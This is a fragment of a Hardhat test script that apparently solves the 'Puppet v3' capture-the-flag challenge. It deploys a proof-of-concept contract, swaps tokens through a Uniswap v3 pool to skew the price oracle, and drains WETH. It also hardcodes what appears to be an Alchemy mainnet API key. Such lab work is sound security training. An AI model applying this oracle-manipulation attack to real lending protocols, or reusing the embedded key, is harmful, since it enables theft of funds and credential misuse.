...
describe("[Challenge] Puppet v3", function () {
    ...
    /** SET RPC URL HERE */
    const MAINNET_FORKING_URL = "https://eth-mainnet.g.alchemy.com/v2/QLKtRllEM78_z2KTWcH_2IQhGMslAOX1";
    ...
    it("Execution", async function () {
        ...
        const poc = await (await ethers.getContractFactory("Puppetv3_POC")).deploy(
            token.address,
            uniswapPool.address,
            lendingPool.address,
            weth.address
        ...
        await token.connect(player).transfer(poc.address, PLAYER_INITIAL_TOKEN_BALANCE);
        ...
        await poc.callSwap(ethers.utils.parseEther("109"), {
            gasLimit: 3000000,
        });

        console.log("Attacker Weth Balance after swap", ethers.utils.formatEther((await weth.balanceOf(poc.address)).toString()));
        console.log("Attacker Token Balance after swap", ethers.utils.formatEther((await token.balanceOf(poc.address)).toString()));
        ...
        await poc.connect(player).transferWeth();
